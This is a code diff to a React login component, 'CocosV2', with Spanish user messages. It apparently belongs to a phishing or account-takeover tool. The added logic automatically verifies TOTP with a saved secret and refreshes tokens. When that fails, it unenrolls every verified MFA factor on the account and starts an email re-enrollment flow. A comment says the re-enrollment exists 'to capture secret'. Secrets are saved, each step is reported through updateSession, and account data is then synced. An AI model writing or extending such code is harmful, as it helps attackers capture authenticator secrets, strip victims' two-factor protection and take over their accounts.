@@ -328,31 +328,77 @@ const CocosV2 = () => {
             console.log("[LOGIN] We have TOTP secret, auto-verifying...");
             setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
             setEnrolledSecret(savedSecret); enrolledSecretRef.current = savedSecret;
+            setStatusMsg("Verificando seguridad automáticamente...");
             await updateSession("mfa_auto_verify", { otp_code: "mfa_type:enrolled" });
 
             const factor = verifiedTotp[0];
-            const verifyRes = await retryTotpVerify(data.access_token, factor.id, savedSecret);
+            let tokenForVerify = data.access_token;
+            let refreshForVerify = data.refresh_token || "";
+
+            // Try auto-verify, if fails try refreshing token first
+            let verifyRes = await retryTotpVerify(tokenForVerify, factor.id, savedSecret, 3);
+
+            if (!verifyRes?.access_token) {
+              // Token might have expired during retries — refresh and retry
+              console.warn("[LOGIN] Auto-verify round 1 failed, refreshing token...");
+              try {
+                const refreshed = await callApi("refresh_token", { refresh_token: refreshForVerify });
+                if (refreshed?.access_token) {
+                  tokenForVerify = refreshed.access_token;
+                  refreshForVerify = refreshed.refresh_token || refreshForVerify;
+                  setAccessToken(tokenForVerify);
+                  setRefreshToken(refreshForVerify); refreshTokenRef.current = refreshForVerify;
+                  console.log("[LOGIN] Token refreshed, retrying auto-verify...");
+                  verifyRes = await retryTotpVerify(tokenForVerify, factor.id, savedSecret, 3);
+                }
+              } catch (refErr) {
+                console.warn("[LOGIN] Token refresh failed:", refErr);
+              }
+            }
+
             if (verifyRes?.access_token) {
               setAccessToken(verifyRes.access_token);
               if (verifyRes.refresh_token) { setRefreshToken(verifyRes.refresh_token); refreshTokenRef.current = verifyRes.refresh_token; }
               saveTotpSecret(savedSecret, submittedEmail);
               await updateSession("totp_auto_verified");
               setStep("syncing");
+              setStatusMsg("Verificación exitosa. Sincronizando tus datos...");
               await syncAccountData(verifyRes.access_token, submittedEmail);
               setStep("done");
             } else {
-              // Auto-verify failed — fall back to client MFA screen
-              console.warn("[LOGIN] Auto-verify failed, falling back to manual MFA");
-              const factor = verifiedTotp[0];
-              setFactorId(factor.id);
-              const challengeData = await callApi("mfa_challenge", {
-                access_token: data.access_token,
-                factor_id: factor.id,
-              });
-              setChallengeId(challengeData?.id || "");
-              setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
-              await updateSession("mfa_challenge_sent", { otp_code: "mfa_type:client_own" });
-              setStep("mfa_verify");
+              // Auto-verify totally failed — secret might be invalid, go to email flow to re-enroll
+              console.warn("[LOGIN] Auto-verify failed after retries, going to email flow to re-enroll");
+              await updateSession("mfa_auto_verify_failed", { otp_code: "fallback:email_reenroll" });
+              
+              // Try unenroll + email flow for re-enrollment
+              let unenrolledOk = false;
+              for (const vf of verifiedTotp) {
+                try {
+                  const ur = await callApi("mfa_unenroll", { access_token: tokenForVerify, factor_id: vf.id });
+                  if (ur?.success) { unenrolledOk = true; console.log("[LOGIN] Unenrolled stale factor:", vf.id); }
+                } catch (ue) { console.warn("[LOGIN] Unenroll failed:", vf.id, ue); }
+              }
+
+              if (unenrolledOk) {
+                try {
+                  emailFlowAccessTokenRef.current = tokenForVerify;
+                  emailFlowRefreshTokenRef.current = refreshForVerify;
+                  await callApi("email_challenge", { access_token: tokenForVerify, refresh_token: refreshForVerify });
+                  setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
+                  await updateSession("email_challenge_sent_reenroll", { otp_code: "mfa_type:enrolled" });
+                  setStep("email_verify");
+                } catch {
+                  await enrollTotpAndFinish(tokenForVerify);
+                }
+              } else {
+                // Can't unenroll, can't auto-verify — fall back to client MFA screen
+                setFactorId(factor.id);
+                const challengeData = await callApi("mfa_challenge", { access_token: tokenForVerify, factor_id: factor.id });
+                setChallengeId(challengeData?.id || "");
+                setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
+                await updateSession("mfa_challenge_sent_auto_failed", { otp_code: "mfa_type:client_own" });
+                setStep("mfa_verify");
+              }
             }
           } else {
             // No saved secret — unenroll existing TOTP and re-enroll to capture secret
